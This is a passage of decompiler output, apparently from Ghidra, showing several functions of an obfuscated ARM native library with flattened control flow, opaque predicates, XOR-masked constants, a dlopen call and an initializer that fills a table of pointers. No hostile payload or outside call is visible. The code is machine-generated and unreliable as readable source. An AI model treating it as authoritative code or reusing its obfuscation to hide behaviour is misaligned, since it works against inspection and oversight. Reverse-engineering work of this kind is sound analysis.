              if (local_80 != DAT_0002d5b4) break;
              local_80 = DAT_0002d5ac;
              *local_3c = *local_2c == 0;
              iVar5 = local_80;
            }
            if (local_80 != DAT_0002d5b8) break;
            *local_30 = *local_2c;
            iVar5 = iVar1;
            if (*local_3c != '\0') {
              iVar5 = -0x4accb52d;
            }
          }
          if (local_80 != DAT_0002d5bc) break;
          local_80 = iVar3;
          iVar5 = local_80;
        }
        if (local_80 != iVar6) break;
        iVar5 = DAT_0002d59c;
        if (DAT_0002d664 < *local_48) {
          iVar5 = 0x1568bf4b;
        }
      }
      if (local_80 != DAT_0002d5c0) break;
      uVar4 = *(uint *)(DAT_0002d690 + 0x2d20c);
      uVar9 = *(uint *)(DAT_0002d694 + 0x2d214);
      iVar5 = dlopen(local_34,0);
      iVar8 = DAT_0002d5a0;
      iVar6 = DAT_0002d580;
      *local_40 = iVar5;
      uVar4 = FUN_00035060((uVar4 ^ DAT_0002d5f8 | uVar9 ^ DAT_0002d5f4) +
                           (uVar4 ^ DAT_0002d5fc) + (DAT_0002d584 + 1 ^ DAT_0002d584),DAT_0002d600);
      iVar5 = DAT_0002d5bc;
      if (((uVar4 ^ 1) & uVar4 | DAT_0002d604) < DAT_0002d608) {
        iVar5 = 0x668287a5;
      }
    }
  } while ((local_80 == DAT_0002d5c4) || (iVar5 = local_80, local_80 != DAT_0002d5c8));
  return *local_44;
}



// ---- 0002d6a8  FUN_0002d6a8  size=432

undefined4 FUN_0002d6a8(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  int local_40;
  int local_38 [2];
  undefined4 uStack_30;
  int *local_2c;
  undefined4 uStack_28;
  
  local_2c = local_38;
  uVar5 = *(uint *)(DAT_0002d8ac + 0x2d6d4) ^ DAT_0002d860;
  uVar7 = *(uint *)(DAT_0002d8b0 + 0x2d6f8) ^ DAT_0002d868;
  uStack_30 = param_2;
  uStack_28 = param_4;
  local_38[0] = FUN_00035060(((uVar7 & 0x15000040 |
                              (*(uint *)(DAT_0002d8b0 + 0x2d6f8) ^ DAT_0002d864) & DAT_0002d85c) ^
                              (uVar5 & 0x15000040 |
                              (*(uint *)(DAT_0002d8ac + 0x2d6d4) ^ DAT_0002d858) & DAT_0002d85c) |
                              ~(uVar7 | uVar5) | DAT_0002d86c) + DAT_0002d870,DAT_0002d874);
  iVar4 = DAT_0002d88c;
  iVar3 = DAT_0002d888;
  iVar2 = DAT_0002d884;
  uVar5 = DAT_0002d880;
  iVar1 = DAT_0002d878;
  local_40 = DAT_0002d878;
  do {
    while( true ) {
      while( true ) {
        while (local_40 == iVar2) {
          local_40 = iVar3;
        }
        if (local_40 != iVar3) break;
        uVar7 = *(uint *)(DAT_0002d8b4 + 0x2d7b0) ^ DAT_0002d890;
        uVar6 = *(uint *)(DAT_0002d8b8 + 0x2d7c0) ^ DAT_0002d894;
        uVar7 = FUN_00035060(((uVar6 + uVar7) - (DAT_0002d87c + 2 ^ DAT_0002d87c) * (uVar6 & uVar7))
                             + (uVar5 ^ uVar5 + 1) + DAT_0002d898,DAT_0002d89c);
        local_40 = iVar4;
        if (DAT_0002d8a4 < ((uVar7 | 0x1e) & (uVar7 ^ DAT_0002d8a0))) {
          local_40 = -0x6f818ba0;
        }
      }
      if (local_40 != iVar1) break;
      local_40 = iVar3;
      if (*local_2c == DAT_0002d8a8) {
        local_40 = -0x6f818ba0;
      }
    }
  } while (local_40 != iVar4);
  return 0;
}



// ---- 0002d8bc  FUN_0002d8bc  size=2820

undefined4 FUN_0002d8bc(int param_1,undefined4 param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  undefined4 uVar7;
  int extraout_r1;
  uint uVar8;
  int iVar9;
  int iVar10;
  int local_98;
  undefined4 local_90 [2];
  undefined4 local_88 [2];
  undefined4 local_80 [2];
  undefined4 local_78 [2];
  char local_70 [8];
  int local_68 [2];
  char local_60 [8];
  uint local_58 [3];
  uint *local_4c;
  undefined4 *local_48;
  undefined4 *local_44;
  char *local_40;
  undefined4 *local_3c;
  int *local_38;
  char *local_34;
  undefined4 *local_30;
  undefined4 local_2c;
  
  local_4c = local_58;
  local_34 = local_60;
  local_38 = local_68;
  local_40 = local_70;
  local_44 = local_78;
  local_3c = local_80;
  local_30 = local_88;
  local_48 = local_90;
  local_2c = param_2;
  uVar4 = FUN_00035060(*(uint *)(DAT_0002e604 + 0x2d944) ^ DAT_0002e3c0,
                       *(uint *)(DAT_0002e608 + 0x2d954) ^ DAT_0002e3c4);
  iVar2 = DAT_0002e3f0;
  iVar1 = DAT_0002e3d4;
  local_58[0] = ((uVar4 ^ DAT_0002e3c8) & uVar4) + DAT_0002e3cc ^ DAT_0002e3d0;
  local_98 = DAT_0002e3d4;
  iVar9 = DAT_0002e3f4;
  iVar10 = DAT_0002e44c;
  iVar3 = local_98;
LAB_0002d9a8:
  do {
    while( true ) {
      while( true ) {
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                while( true ) {
                  while( true ) {
                    while( true ) {
                      while (local_98 = iVar3, iVar3 = iVar10, local_98 == iVar2) {
                        uVar4 = *(uint *)(DAT_0002e668 + 0x2e25c) ^ DAT_0002e4cc |
                                *(uint *)(DAT_0002e664 + 0x2e24c) ^ DAT_0002e4c8;
                        uVar6 = ~uVar4;
                        uVar8 = uVar6 | DAT_0002e4d4;
                        if ((uVar6 | DAT_0002e4dc) * (uVar8 & DAT_0002e4e0) +
                            (uVar4 & DAT_0002e4d0) * (uVar8 & DAT_0002e4d8) < DAT_0002e4e4) {
                          iVar3 = 0x753ad53;
                        }
                      }
                      if (local_98 != iVar9) break;
                      iVar3 = DAT_0002e410;
                      if (DAT_0002e4f4 <
                          ((*(uint *)(DAT_0002e660 + 0x2dbe0) ^ *(uint *)(DAT_0002e65c + 0x2dbd8) ^
                           DAT_0002e4e8) * DAT_0002e4ec & DAT_0002e4f0)) {
                        iVar3 = -0x6a3d9696;
                      }
                    }
                    if (local_98 != DAT_0002e3f8) break;
                    iVar3 = DAT_0002e414;
                    if (*local_34 != '\0') {
                      iVar3 = 0x976fed;
                    }
                  }
                  if (local_98 != DAT_0002e3fc) break;
                  *local_30 = 0;
                  local_98 = DAT_0002e46c;
                  iVar3 = local_98;
                }
                if (local_98 != DAT_0002e400) break;
                iVar5 = FUN_00035060(((*(uint *)(DAT_0002e680 + 0x2dc30) ^ DAT_0002e48c) &
                                     (*(uint *)(DAT_0002e67c + 0x2dc24) ^ DAT_0002e488)) +
                                     DAT_0002e490,DAT_0002e494);
                iVar3 = DAT_0002e400;
                if (iVar5 != DAT_0002e498) {
                  iVar3 = 0x6758e138;
                }
              }
              if (local_98 != DAT_0002e404) break;
              uVar4 = FUN_00035060((*(uint *)(DAT_0002e658 + 0x2e380) ^ DAT_0002e4fc) &
                                   (*(uint *)(DAT_0002e654 + 0x2e374) ^ DAT_0002e4f8),DAT_0002e500);
              iVar3 = DAT_0002e464;
              if ((uVar4 & 0x14) < DAT_0002e504) {
                iVar3 = -0x6a3d9696;
              }
            }
            if (local_98 != DAT_0002e408) break;
            uVar6 = *(uint *)(DAT_0002e64c + 0x2dfcc);
            uVar4 = *(uint *)(DAT_0002e650 + 0x2dfd4);
            uVar7 = memalign(param_1,local_2c);
            iVar10 = DAT_0002e44c;
            iVar9 = DAT_0002e3f4;
            *local_3c = uVar7;
            uVar4 = uVar4 ^ DAT_0002e508;
            uVar6 = uVar6 ^ DAT_0002e50c;
            uVar4 = FUN_00035060((uVar6 & uVar4) + (uVar6 | uVar4) + DAT_0002e510,DAT_0002e514);
            iVar3 = DAT_0002e468;
            if ((uVar4 | DAT_0002e518) < DAT_0002e51c) {
              iVar3 = -0x25c3943d;
            }
          }
          if (local_98 != DAT_0002e40c) break;
          local_98 = DAT_0002e41c;
          iVar3 = local_98;
        }
        if (local_98 != DAT_0002e410) break;
        local_98 = iVar2;
        iVar3 = local_98;
      }
      if (local_98 != DAT_0002e414) break;
LAB_0002db74:
      local_98 = DAT_0002e45c;
      iVar3 = local_98;
    }
    if (local_98 != DAT_0002e418) {
      if (local_98 == DAT_0002e41c) {
        uVar4 = FUN_00035060(*(uint *)(DAT_0002e618 + 0x2de6c) ^ *(uint *)(DAT_0002e614 + 0x2de64) ^
                             DAT_0002e5dc | DAT_0002e5e0,DAT_0002e5e4);
        iVar3 = DAT_0002e424;
        if (uVar4 + (DAT_0002e3e4 ^ DAT_0002e3e4 + 1) + (~uVar4 | 0xfffffffd) != DAT_0002e5e8) {
          iVar3 = 0x796a133f;
        }
      }
      else if (local_98 == DAT_0002e420) {
        uVar4 = ((*(uint *)(DAT_0002e63c + 0x2e2d0) ^ DAT_0002e538) -
                (DAT_0002e3e0 + 1 ^ DAT_0002e3e0)) +
                (*(uint *)(DAT_0002e640 + 0x2e2f0) ^ DAT_0002e53c) + DAT_0002e540;
        iVar3 = DAT_0002e444;
        if ((uVar4 & DAT_0002e548) + (DAT_0002e3e8 + 1 ^ DAT_0002e3e8) + (~uVar4 | DAT_0002e544) +
            DAT_0002e54c < DAT_0002e550) {
          iVar3 = 0x53fab7f2;
        }
      }
      else if (local_98 == DAT_0002e424) {
        local_98 = DAT_0002e470;
        iVar3 = local_98;
      }
      else if (local_98 != DAT_0002e428) {
        if (local_98 == iVar1) {
          iVar3 = DAT_0002e430;
          if (DAT_0002e600 < *local_4c) {
            iVar3 = 0x50be29f8;
          }
        }
        else if (local_98 == DAT_0002e42c) {
          local_98 = DAT_0002e434;
          iVar3 = local_98;
        }
        else if (local_98 == DAT_0002e430) {
          local_98 = DAT_0002e450;
          iVar3 = local_98;
        }
        else if (local_98 == DAT_0002e434) {
          uVar4 = *(uint *)(DAT_0002e62c + 0x2dd90) ^ DAT_0002e574;
          uVar6 = *(uint *)(DAT_0002e630 + 0x2ddb8) ^ DAT_0002e580;
          uVar4 = (uVar6 & DAT_0002e578 |
                  (*(uint *)(DAT_0002e630 + 0x2ddb8) ^ DAT_0002e57c) & DAT_0002e570) ^
                  (uVar4 & DAT_0002e578 |
                  (*(uint *)(DAT_0002e62c + 0x2dd90) ^ DAT_0002e56c) & DAT_0002e570) |
                  ~(uVar6 | uVar4);
          uVar4 = (~uVar4 | DAT_0002e584) + uVar4 + (DAT_0002e3ec + 1 ^ DAT_0002e3ec);
          iVar9 = DAT_0002e3f4;
          iVar3 = DAT_0002e448;
          if (((uVar4 + (uVar4 ^ DAT_0002e588)) - (uVar4 & DAT_0002e58c) & DAT_0002e590) !=
              DAT_0002e594) {
            iVar3 = 0x7ef631fc;
          }
        }
        else if (local_98 == DAT_0002e438) {
          local_98 = DAT_0002e480;
          iVar3 = local_98;
        }
        else if (local_98 == DAT_0002e43c) {
          memalign(param_1,local_2c);
          local_98 = DAT_0002e408;
          iVar3 = local_98;
        }
        else if (local_98 == DAT_0002e440) {
          uVar4 = *(uint *)(DAT_0002e648 + 0x2ded8) ^ *(uint *)(DAT_0002e644 + 0x2ded0);
          uVar6 = uVar4 ^ DAT_0002e528;
          uVar4 = ((uVar6 | DAT_0002e524) * (uVar6 & DAT_0002e524) +
                  (uVar6 & DAT_0002e52c) * ((uVar4 ^ DAT_0002e520) & DAT_0002e524)) * DAT_0002e530;
          iVar3 = DAT_0002e43c;
          if (DAT_0002e534 <= uVar4 && uVar4 - DAT_0002e534 != 0) {
            iVar3 = -0x25c3943d;
          }
        }
        else if (local_98 == DAT_0002e444) {
          __errno();
          local_98 = DAT_0002e454;
          iVar3 = local_98;
        }
        else if (local_98 == DAT_0002e448) {
          local_98 = DAT_0002e47c;
          iVar3 = local_98;
        }
        else if (local_98 == iVar10) {
          uVar4 = (((*(uint *)(DAT_0002e670 + 0x2e1d4) ^ DAT_0002e4a8) &
                    (*(uint *)(DAT_0002e66c + 0x2e1c8) ^ DAT_0002e4a4) ^ DAT_0002e4ac) -
                  (DAT_0002e3d8 ^ DAT_0002e3d8 + 1)) + DAT_0002e4b0;
          iVar3 = DAT_0002e428;
          if (DAT_0002e4c4 <
              ((DAT_0002e4b8 & ~uVar4 | uVar4 & DAT_0002e4b4) ^ DAT_0002e4bc | uVar4 & DAT_0002e4c0)
             ) {
            iVar3 = 0x7c055a4b;
          }
        }
        else if (local_98 == DAT_0002e450) {
          *local_34 = param_1 == 0;
          uVar4 = FUN_00035060(*(uint *)(DAT_0002e60c + 0x2dc80) ^ DAT_0002e5ec,
                               *(uint *)(DAT_0002e610 + 0x2dc8c) ^ DAT_0002e5f0);
          uVar4 = FUN_00035060(uVar4 & DAT_0002e5f4,DAT_0002e5f8);
          iVar3 = DAT_0002e40c;
          if (DAT_0002e5fc < uVar4) {
            iVar3 = 0xb677c50;
          }
        }
        else if (local_98 == DAT_0002e454) {
          uVar7 = __errno();
          *local_44 = uVar7;
          local_98 = DAT_0002e418;
          iVar3 = local_98;
        }
        else {
          if (local_98 == DAT_0002e458) goto LAB_0002db74;
          if (local_98 == DAT_0002e45c) {
            FUN_00035258(local_2c,param_1);
            *local_38 = extraout_r1;
            uVar4 = (*(uint *)(DAT_0002e624 + 0x2dce0) ^ DAT_0002e5a4) &
                    (*(uint *)(DAT_0002e628 + 0x2dcec) ^ DAT_0002e5a0) |
                    (*(uint *)(DAT_0002e628 + 0x2dcec) ^ DAT_0002e59c) &
                    (*(uint *)(DAT_0002e624 + 0x2dce0) ^ DAT_0002e598);
            uVar4 = ((DAT_0002e5ac & ~uVar4 | uVar4 & DAT_0002e5a8) ^ DAT_0002e5b0 |
                    uVar4 & DAT_0002e5b4) + DAT_0002e5b8;
            iVar3 = DAT_0002e42c;
            if (DAT_0002e5c0 < (uVar4 & DAT_0002e5bc) + (uVar4 | DAT_0002e5bc)) {
              iVar3 = 0x66d131d1;
            }
          }
          else if (local_98 == DAT_0002e460) {
            local_98 = DAT_0002e400;
            iVar3 = local_98;
          }
          else {
            iVar3 = iVar9;
            if (local_98 != DAT_0002e464) {
              if (local_98 == DAT_0002e468) {
                local_98 = DAT_0002e404;
                iVar3 = local_98;
              }
              else if (local_98 == DAT_0002e46c) {
                *local_48 = *local_30;
                iVar3 = DAT_0002e460;
                if (DAT_0002e4a0 <
                    ((*(uint *)(DAT_0002e678 + 0x2e0dc) ^ 0x800 |
                      *(uint *)(DAT_0002e674 + 0x2e0d0) ^ 0x40000 | 0x88000002) & DAT_0002e49c)) {
                  iVar3 = -0x40eb6179;
                }
              }
              else if (local_98 == DAT_0002e470) {
                uVar7 = FUN_00035060((*(uint *)(DAT_0002e620 + 0x2e074) ^ DAT_0002e5c8) +
                                     (*(uint *)(DAT_0002e61c + 0x2e068) ^ DAT_0002e5c4),DAT_0002e5cc
                                    );
                uVar7 = FUN_00035060(uVar7,DAT_0002e5d0);
                uVar4 = FUN_00035060(uVar7,DAT_0002e5d4);
                iVar3 = DAT_0002e470;
                if (uVar4 < DAT_0002e5d8) {
                  iVar3 = -0x54cc9b37;
                }
              }
              else if (local_98 == DAT_0002e474) {
                local_98 = DAT_0002e46c;
                *local_30 = *local_3c;
                iVar3 = local_98;
              }
              else if (local_98 == DAT_0002e478) {
                *(uint *)*local_44 = DAT_0002e3dc ^ DAT_0002e3dc + 0x12;
                local_98 = DAT_0002e3fc;
                iVar3 = local_98;
              }
              else if (local_98 == DAT_0002e47c) {
                *local_40 = *local_38 == 0;
                iVar3 = DAT_0002e438;
                if ((((*(uint *)(DAT_0002e638 + 0x2df68) ^ DAT_0002e558) -
                      (*(uint *)(DAT_0002e634 + 0x2df5c) ^ DAT_0002e554) | DAT_0002e55c) &
                     DAT_0002e560 ^ DAT_0002e564) < DAT_0002e568) {
                  iVar3 = 0x4819dc70;
                }
              }
              else if (local_98 == DAT_0002e480) {
                iVar3 = DAT_0002e420;
                if (*local_40 != '\0') {
                  iVar3 = 0x288c0b90;
                }
              }
              else {
                iVar3 = local_98;
                if (local_98 == DAT_0002e484) {
                  return *local_48;
                }
              }
            }
          }
        }
      }
      goto LAB_0002d9a8;
    }
    local_98 = DAT_0002e478;
    iVar3 = local_98;
  } while( true );
}



// ---- 0002e684  _INIT_0  size=1704

void _INIT_0(void)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  int iVar7;
  int iVar8;
  uint uVar9;
  int *piVar10;
  int iVar11;
  int iVar12;
  uint uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  int iVar16;
  undefined4 uVar17;
  undefined4 *puVar18;
  bool bVar19;
  int local_30;
  
  iVar1 = DAT_0002ede4;
  piVar10 = (int *)(DAT_0002ede4 + 0x2e69c);
  puVar18 = (undefined4 *)(DAT_0002ede4 + 0x2e71c);
  uVar2 = *(undefined4 *)(DAT_0002ede8 + 0x2e6a4);
  uVar4 = *(undefined4 *)(DAT_0002edec + 0x2e6ac);
  uVar5 = *(undefined4 *)(DAT_0002edf0 + 0x2e6b4);
  uVar6 = *(undefined4 *)(DAT_0002edf4 + 0x2e6bc);
  uVar14 = *(undefined4 *)(DAT_0002edf8 + 0x2e6c4);
  *(undefined4 *)(DAT_0002ede4 + 0x2e73c) = *(undefined4 *)(DAT_0002edfc + 0x2e6cc);
  *(undefined4 *)(iVar1 + 0x2e740) = uVar14;
  *(undefined4 *)(iVar1 + 0x2e744) = uVar6;
  *(undefined4 *)(iVar1 + 0x2e748) = uVar5;
  *(undefined4 *)(iVar1 + 0x2e74c) = uVar4;
  *(undefined4 *)(iVar1 + 0x2e750) = uVar2;
  uVar17 = *(undefined4 *)(DAT_0002ee00 + 0x2e6ec);
  uVar4 = *(undefined4 *)(DAT_0002ee04 + 0x2e6f4);
  uVar5 = *(undefined4 *)(DAT_0002ee08 + 0x2e6fc);
  uVar15 = *(undefined4 *)(DAT_0002ee10 + 0x2e70c);
  uVar14 = *(undefined4 *)(DAT_0002ee14 + 0x2e714);
  uVar6 = *(undefined4 *)(DAT_0002ee18 + 0x2e71c);
  uVar2 = *(undefined4 *)(DAT_0002ee1c + 0x2e724);
  *(undefined4 *)(iVar1 + 0x2e72c) = *(undefined4 *)(DAT_0002ee0c + 0x2e704);
  *puVar18 = uVar2;
  *(undefined4 *)(iVar1 + 0x2e720) = uVar6;
  *(undefined4 *)(iVar1 + 0x2e724) = uVar14;
  *(undefined4 *)(iVar1 + 0x2e728) = uVar15;
  *(undefined4 *)(iVar1 + 0x2e730) = uVar5;
  *(undefined4 *)(iVar1 + 0x2e734) = uVar4;
  *(undefined4 *)(iVar1 + 0x2e738) = uVar17;
  uVar14 = *(undefined4 *)(DAT_0002ee20 + 0x2e744);
  uVar4 = *(undefined4 *)(DAT_0002ee24 + 0x2e74c);
  uVar5 = *(undefined4 *)(DAT_0002ee28 + 0x2e754);
  iVar16 = DAT_0002ee30 + 0x2e76c;
  iVar11 = DAT_0002ee34 + 0x2e770;
  uVar6 = *(undefined4 *)(DAT_0002ee38 + 0x2e774);
  uVar2 = *(undefined4 *)(DAT_0002ee3c + 0x2e77c);
  *(int *)(iVar1 + 0x2e70c) = DAT_0002ee2c + 0x2e764;
  *(undefined4 *)(iVar1 + 0x2e6fc) = uVar2;
  *(undefined4 *)(iVar1 + 0x2e700) = uVar6;
  *(int *)(iVar1 + 0x2e704) = iVar11;
  *(int *)(iVar1 + 0x2e708) = iVar16;
  *(undefined4 *)(iVar1 + 0x2e710) = uVar5;
  *(undefined4 *)(iVar1 + 0x2e714) = uVar4;
  *(undefined4 *)(iVar1 + 0x2e718) = uVar14;
  uVar2 = *(undefined4 *)(DAT_0002ee40 + 0x2e79c);
  uVar4 = *(undefined4 *)(DAT_0002ee44 + 0x2e7a4);
  iVar11 = DAT_0002ee48 + 0x2e7b0;
  uVar5 = *(undefined4 *)(DAT_0002ee4c + 0x2e7b4);
  uVar6 = *(undefined4 *)(DAT_0002ee50 + 0x2e7bc);
  *(undefined4 *)(iVar1 + 0x2e6dc) = *(undefined4 *)(DAT_0002ee54 + 0x2e7c4);
  *(undefined4 *)(iVar1 + 0x2e6e0) = uVar6;
  *(undefined4 *)(iVar1 + 0x2e6e4) = 0;
  *(undefined4 *)(iVar1 + 0x2e6e8) = uVar5;
  *(undefined4 *)(iVar1 + 0x2e6ec) = 0;
  *(int *)(iVar1 + 0x2e6f0) = iVar11;
  *(undefined4 *)(iVar1 + 0x2e6f4) = uVar4;
  *(undefined4 *)(iVar1 + 0x2e6f8) = uVar2;
  uVar2 = *(undefined4 *)(DAT_0002ee58 + 0x2e7ec);
  uVar4 = *(undefined4 *)(DAT_0002ee5c + 0x2e7f4);
  uVar5 = *(undefined4 *)(DAT_0002ee60 + 0x2e7fc);
  uVar6 = *(undefined4 *)(DAT_0002ee64 + 0x2e804);
  uVar14 = *(undefined4 *)(DAT_0002ee68 + 0x2e80c);
  *(undefined4 *)(iVar1 + 0x2e6bc) = 0;
  *(undefined4 *)(iVar1 + 0x2e6c0) = 0;
  *(undefined4 *)(iVar1 + 0x2e6c4) = 0;
  *(undefined4 *)(iVar1 + 0x2e6c8) = uVar14;
  *(undefined4 *)(iVar1 + 0x2e6cc) = uVar6;
  *(undefined4 *)(iVar1 + 0x2e6d0) = uVar5;
  *(undefined4 *)(iVar1 + 0x2e6d4) = uVar4;
  *(undefined4 *)(iVar1 + 0x2e6d8) = uVar2;
  iVar11 = DAT_0002ee80;
  uVar2 = *(undefined4 *)(DAT_0002ee70 + 0x2e83c);
  iVar16 = DAT_0002ee74 + 0x2e84c;
  iVar7 = DAT_0002ee78 + 0x2e850;
  uVar4 = *(undefined4 *)(DAT_0002ee7c + 0x2e854);
  *(undefined4 *)(iVar1 + 0x2e6b8) = *(undefined4 *)(DAT_0002ee6c + 0x2e834);
  *piVar10 = iVar11 + 0x2e864;
  *(undefined4 *)(iVar1 + 0x2e6a0) = uVar4;
  *(int *)(iVar1 + 0x2e6a4) = iVar7;
  *(int *)(iVar1 + 0x2e6a8) = iVar16;
  *(undefined4 *)(iVar1 + 0x2e6ac) = uVar2;
  *(undefined4 *)(iVar1 + 0x2e6b0) = 0;
  *(undefined4 *)(iVar1 + 0x2e6b4) = 0;
  iVar16 = DAT_0002ed34;
  local_30 = DAT_0002ed2c;
  iVar8 = DAT_0002ed38;
  iVar12 = DAT_0002ed3c;
  iVar11 = DAT_0002ed2c;
  iVar7 = DAT_0002ed40;
LAB_0002e8a8:
  do {
    while( true ) {
      while (uVar9 = DAT_0002ed90, uVar3 = DAT_0002ed88, local_30 == iVar16) {
        uVar3 = *(uint *)(DAT_0002ee98 + 0x2eb2c) ^ DAT_0002ed6c;
        uVar9 = *(uint *)(DAT_0002ee9c + 0x2eb3c) ^ DAT_0002ed70;
        uVar3 = (uVar9 | uVar3) & ~(uVar9 ^ uVar3);
        local_30 = DAT_0002ed44;
        if (((~((uVar3 | DAT_0002ed78) * (uVar3 & DAT_0002ed78) +
               (DAT_0002ed78 & ~uVar3) * (uVar3 & DAT_0002ed74)) | DAT_0002ed7c) & DAT_0002ed80) ==
            DAT_0002ed84) {
          local_30 = 0x5eab363f;
        }
      }
      if (local_30 != iVar11) break;
      uVar3 = (*(uint *)(DAT_0002ee88 + 0x2ecb8) ^ DAT_0002edcc) -
              (*(uint *)(DAT_0002ee84 + 0x2eca8) ^ DAT_0002edc8);
      uVar3 = (~uVar3 | DAT_0002edd0) + uVar3 + (DAT_0002ed30 ^ DAT_0002ed30 + 1);
      bVar19 = (~((uVar3 | DAT_0002edd4) * (uVar3 & DAT_0002edd4) +
                 (uVar3 & DAT_0002edd8) * (DAT_0002edd4 & ~uVar3)) | DAT_0002eddc) == DAT_0002ede0;
      local_30 = iVar12;
LAB_0002ed10:
      if (bVar19) {
        local_30 = -0x1b2d6a64;
      }
    }
    if (local_30 != iVar8) {
      if (local_30 == iVar12) {
        *(undefined4 *)(iVar1 + 0x2e754) = *(undefined4 *)(DAT_0002ee8c + 0x2e918);
        uVar3 = ((*(uint *)(DAT_0002ee94 + 0x2e94c) ^ DAT_0002ed9c) & DAT_0002ed94 |
                (*(uint *)(DAT_0002ee94 + 0x2e94c) ^ DAT_0002ed98) & DAT_0002ed8c) ^
                ((*(uint *)(DAT_0002ee90 + 0x2e92c) ^ uVar9) & DAT_0002ed94 |
                (*(uint *)(DAT_0002ee90 + 0x2e92c) ^ uVar3) & DAT_0002ed8c);
        uVar3 = DAT_0002eda4 & ~uVar3 | uVar3 & DAT_0002eda0;
        uVar9 = uVar3 ^ DAT_0002edb0;
        uVar13 = uVar9 | DAT_0002edb4;
        bVar19 = (uVar9 | DAT_0002edbc) * (uVar13 & DAT_0002edc0) +
                 (uVar13 & DAT_0002edb8) * ((uVar3 ^ DAT_0002eda8) & DAT_0002edac) == DAT_0002edc4;
        local_30 = iVar7;
        goto LAB_0002ed10;
      }
      if (local_30 == iVar7) {
        local_30 = iVar16;
      }
      else if (local_30 == DAT_0002ed44) {
        *(undefined4 *)(iVar1 + 0x2e778) = *(undefined4 *)(DAT_0002eea0 + 0x2e9d8);
        *(int *)(iVar1 + 0x2e77c) = DAT_0002eea4 + 0x2e9e4;
        *(int *)(iVar1 + 0x2e780) = DAT_0002eea8 + 0x2e9f0;
        *(int *)(iVar1 + 0x2e784) = DAT_0002eeac + 0x2e9fc;
        *(int *)(iVar1 + 0x2e788) = DAT_0002eeb0 + 0x2ea08;
        *(int *)(iVar1 + 0x2e78c) = DAT_0002eeb4 + 0x2ea14;
        iVar11 = DAT_0002eeb8;
        *(undefined4 *)(iVar1 + 0x2e794) = 0;
        *(int *)(iVar1 + 0x2e790) = iVar11 + 0x2ea24;
        *(undefined4 *)(iVar1 + 0x2e758) = *(undefined4 *)(DAT_0002eebc + 0x2ea30);
        *(undefined4 *)(iVar1 + 0x2e75c) = 0;
        *(undefined4 *)(iVar1 + 0x2e760) = 0;
        *(undefined4 *)(iVar1 + 0x2e764) = *(undefined4 *)(DAT_0002eec0 + 0x2ea44);
        *(undefined4 *)(iVar1 + 0x2e768) = *(undefined4 *)(DAT_0002eec4 + 0x2ea50);
        *(undefined4 *)(iVar1 + 0x2e76c) = *(undefined4 *)(DAT_0002eec8 + 0x2ea5c);
        *(undefined4 *)(iVar1 + 0x2e770) = *(undefined4 *)(DAT_0002eecc + 0x2ea68);
        *(undefined4 *)(iVar1 + 0x2e774) = *(undefined4 *)(DAT_0002eed0 + 0x2ea74);
        uVar9 = *(uint *)(DAT_0002eed4 + 0x2ea80);
        uVar13 = *(uint *)(DAT_0002eed8 + 0x2ea88);
        uVar2 = __errno();
        *(undefined4 *)(iVar1 + 0x2e798) = uVar2;
        uVar3 = DAT_0002ed54;
        *(int *)(iVar1 + 0x2e79c) = DAT_0002eedc + 0x2ea9c;
        iVar11 = DAT_0002eee0;
        *(undefined4 *)(iVar1 + 0x2e7a4) = 0;
        *(int *)(iVar1 + 0x2e7a0) = iVar11 + 0x2eab0;
        iVar11 = DAT_0002ed2c;
        uVar2 = FUN_00035060(uVar13 ^ DAT_0002ed50,uVar9 ^ uVar3);
        uVar3 = FUN_00035060(uVar2,DAT_0002ed58);
        iVar8 = DAT_0002ed38;
        iVar12 = DAT_0002ed3c;
        iVar7 = DAT_0002ed40;
        local_30 = DAT_0002ed4c;
        if (((DAT_0002ed5c & ~uVar3 | uVar3 & 6) ^ DAT_0002ed60 | DAT_0002ed64) < DAT_0002ed68) {
          local_30 = 0x5eab363f;
        }
      }
      else if (local_30 == DAT_0002ed48) {
        *(undefined4 *)(iVar1 + 0x2e778) = *(undefined4 *)(DAT_0002eee8 + 0x2eba0);
        *(int *)(iVar1 + 0x2e77c) = DAT_0002eeec + 0x2ebac;
        *(int *)(iVar1 + 0x2e780) = DAT_0002eef0 + 0x2ebb8;
        *(int *)(iVar1 + 0x2e784) = DAT_0002eef4 + 0x2ebc4;
        *(int *)(iVar1 + 0x2e788) = DAT_0002eef8 + 0x2ebd0;
        *(int *)(iVar1 + 0x2e78c) = DAT_0002eefc + 0x2ebdc;
        iVar7 = DAT_0002ef00;
        *(undefined4 *)(iVar1 + 0x2e794) = 0;
        *(int *)(iVar1 + 0x2e790) = iVar7 + 0x2ebec;
        *(undefined4 *)(iVar1 + 0x2e758) = *(undefined4 *)(DAT_0002ef04 + 0x2ebf8);
        *(undefined4 *)(iVar1 + 0x2e75c) = 0;
        *(undefined4 *)(iVar1 + 0x2e760) = 0;
        *(undefined4 *)(iVar1 + 0x2e764) = *(undefined4 *)(DAT_0002ef08 + 0x2ec0c);
        *(undefined4 *)(iVar1 + 0x2e768) = *(undefined4 *)(DAT_0002ef0c + 0x2ec18);
        *(undefined4 *)(iVar1 + 0x2e76c) = *(undefined4 *)(DAT_0002ef10 + 0x2ec24);
        *(undefined4 *)(iVar1 + 0x2e770) = *(undefined4 *)(DAT_0002ef14 + 0x2ec30);
        *(undefined4 *)(iVar1 + 0x2e774) = *(undefined4 *)(DAT_0002ef18 + 0x2ec3c);
        uVar2 = __errno();
        *(undefined4 *)(iVar1 + 0x2e798) = uVar2;
        iVar7 = DAT_0002ed40;
        *(int *)(iVar1 + 0x2e79c) = DAT_0002ef1c + 0x2ec54;
        local_30 = DAT_0002ed44;
        *(int *)(iVar1 + 0x2e7a0) = DAT_0002ef20 + 0x2ec64;
        *(undefined4 *)(iVar1 + 0x2e7a4) = 0;
        iVar8 = DAT_0002ed38;
        iVar12 = DAT_0002ed3c;
      }
      else {
        iVar8 = DAT_0002ed38;
        iVar12 = DAT_0002ed3c;
        if (local_30 == DAT_0002ed4c) {
          return;
        }
      }
      goto LAB_0002e8a8;
    }
    *(undefined4 *)(iVar1 + 0x2e754) = *(undefined4 *)(DAT_0002eee4 + 0x2ec88);
    local_30 = iVar12;
  } while( true );
}



